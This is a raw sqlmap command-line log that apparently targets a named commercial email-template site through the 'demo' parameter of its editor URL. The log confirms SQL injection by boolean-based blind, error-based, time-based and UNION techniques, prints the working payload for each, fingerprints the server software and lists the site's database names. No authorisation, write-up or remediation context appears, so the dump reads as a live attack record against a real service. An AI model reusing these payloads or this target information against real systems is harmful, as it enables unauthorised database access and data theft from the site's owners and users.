http://www.stampready.net/dashboard/editor-3-5/index.php?demo=Wn829TMlu3iwOmKRaGQCAtX0sFDHpVxo
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.3.44#dev}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:00:18 /2019-05-27/

[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[10:00:18] [INFO] testing connection to the target URL
[10:00:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:00:26] [INFO] testing if the target URL content is stable
[10:00:29] [INFO] target URL content is stable
[10:00:29] [INFO] testing if GET parameter 'demo' is dynamic
[10:00:30] [INFO] GET parameter 'demo' appears to be dynamic
[10:00:30] [INFO] heuristic (basic) test shows that GET parameter 'demo' might be injectable (possible DBMS: 'MySQL')
[10:00:31] [INFO] testing for SQL injection on GET parameter 'demo'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[10:00:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:00:36] [INFO] GET parameter 'demo' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="We")
[10:00:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:00:37] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:00:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:00:39] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:00:39] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:00:39] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:00:40] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:00:40] [INFO] GET parameter 'demo' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[10:00:40] [INFO] testing 'MySQL inline queries'
[10:00:40] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[10:00:40] [WARNING] time-based comparison requires larger statistical model, please wait............ (done)
[10:01:23] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[10:01:24] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[10:01:24] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[10:01:24] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[10:01:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[10:01:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[10:01:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[10:01:30] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
[10:02:34] [INFO] GET parameter 'demo' appears to be 'MySQL >= 5.0.12 OR time-based blind' injectable 
[10:02:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:02:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:02:37] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:02:46] [INFO] target URL appears to have 11 columns in query
[10:03:59] [INFO] GET parameter 'demo' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'demo' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
---
Parameter: demo (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: demo=Wn829TMlu3iwOmKRaGQCAtX0sFDHpVxo' AND 5474=5474-- Xikg

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: demo=Wn829TMlu3iwOmKRaGQCAtX0sFDHpVxo' AND (SELECT 2203 FROM(SELECT COUNT(*),CONCAT(0x7162627a71,(SELECT (ELT(2203=2203,1))),0x716b767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YVpA

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: demo=Wn829TMlu3iwOmKRaGQCAtX0sFDHpVxo' OR SLEEP(5)-- wqDE

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: demo=-6185' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162627a71,0x79545152795456664a4e427a6f564869536b51586c5663544b635275504f4b656a516c69634b674d,0x716b767671),NULL,NULL,NULL,NULL,NULL-- lzCd
---
[10:04:00] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.20, PHP 7.0.8
back-end DBMS: MySQL >= 5.0
[10:04:00] [INFO] fetching database names
[10:04:00] [INFO] used SQL query returns 2 entries
[10:04:00] [INFO] retrieved: 'information_schema'
[10:04:00] [INFO] retrieved: 'typea_stampready'
available databases [2]:
[*] information_schema
[*] typea_stampready

[10:04:00] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.stampready.net'

[*] ending @ 10:04:00 /2019-05-27/

